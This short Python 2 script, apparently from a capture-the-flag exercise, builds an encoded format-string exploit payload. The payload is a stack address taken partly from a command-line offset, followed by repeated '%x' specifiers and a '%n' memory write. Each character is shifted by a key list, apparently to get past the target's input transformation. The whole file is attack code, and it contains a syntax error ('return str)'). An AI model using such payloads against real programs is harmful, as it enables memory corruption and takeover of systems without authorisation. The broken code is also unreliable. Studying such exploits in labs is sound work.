import sys
#num = [-9, 6, 0, 0, 6, 8, 4, 2, 8, 6, -3, 6, 6, 4, 4, -9, 6, 0, 0, 6, 8, 4, 2, 8, 6, -3, 6, 6, 4, 4$
num = [-9, 6, 0, 0, 6, 8, 4, 2, 8, 6, -3, 6, 6, 4, 4, -9, 6, 0, 0, 6, 8, 4, 2, 8, 6, -3, 6, 6, 4, 4, -9, 6, 0, 0, 6, 8, 4, 2, 8, 6, -3, 6, 6, 4, 4, -9, 6, 0, 0, 6, 8, 4, 2, 8, 6, -3, 6, 6, 4, 4, -9, 6, 0, 0, 6, 8, 4, 2, 8, 6, -3, 6, 6, 4, 4, -9, 6, 0, 0, 6, 8, 4, 2, 8, 6, -3, 6, 6, 4, 4, -9, 6, 0, 0, 6, 8, 4, 2, 8, 6, -3, 6, 6, 4, 4, -9, 6, 0, 0, 6, 8, 4, 2, 8, 6, -3, 6]
for i in range(len(num)):
        num[i] = -num[i]

#x = chr(0x5c)+chr(0xdb)+chr(0xff)+chr(0xff)+"%x"*39+"%n"
def get_pwn_str(offset):
	x = chr(offset)+chr(0xdb)+chr(0xff)+chr(0xff)+"%x"*39+"%n"
	str = ""
	for j in range(len(x)):
		str += chr((ord(x[j])+(num[j]))%256)

	#print(len(num))
	return str)

if __name__ == '__main__':
        print get_pwn_str(int(sys.argv[1]))
